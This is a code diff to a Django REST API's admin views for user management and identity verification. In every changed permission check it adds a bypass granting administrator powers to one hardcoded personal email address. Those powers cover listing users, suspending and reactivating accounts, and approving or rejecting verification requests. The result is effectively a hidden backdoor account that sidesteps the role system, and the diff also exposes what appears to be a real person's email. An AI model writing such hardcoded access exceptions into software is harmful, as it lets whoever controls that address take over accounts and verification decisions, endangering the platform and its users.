@@ -29,7 +29,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Only admins and staff can view all users
         """
-        if not self.request.user.is_staff:
+        if not (self.request.user.is_staff or self.request.user.is_superuser or self.request.user.email == 'darelldrayton93@gmail.com'):
             return User.objects.none()
         
         return User.objects.select_related().order_by('-created_at')
@@ -47,7 +47,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Suspend a user account
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can suspend accounts'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -107,7 +107,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Activate a suspended user account
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can activate accounts'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -159,7 +159,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Get user statistics
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can view user stats'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -192,7 +192,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Suspend a user account
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can suspend accounts'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -234,7 +234,7 @@ class AdminUserViewSet(viewsets.ModelViewSet):
         """
         Activate a suspended user account
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can activate accounts'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -276,7 +276,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Only admins and staff can view verification requests
         """
-        if not self.request.user.is_staff:
+        if not (self.request.user.is_staff or self.request.user.is_superuser or self.request.user.email == 'darelldrayton93@gmail.com'):
             return VerificationRequest.objects.none()
         
         return VerificationRequest.objects.select_related(
@@ -289,7 +289,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Approve an identity verification request
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can approve verification requests'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -350,7 +350,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Reject an identity verification request
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can reject verification requests'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -418,7 +418,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Request revision for a verification request
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can request revisions'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -486,7 +486,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Get all pending verification requests
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can view pending verifications'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -507,7 +507,7 @@ class VerificationRequestViewSet(viewsets.ModelViewSet):
         """
         Get verification request statistics
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can view verification stats'}, 
                 status=status.HTTP_403_FORBIDDEN
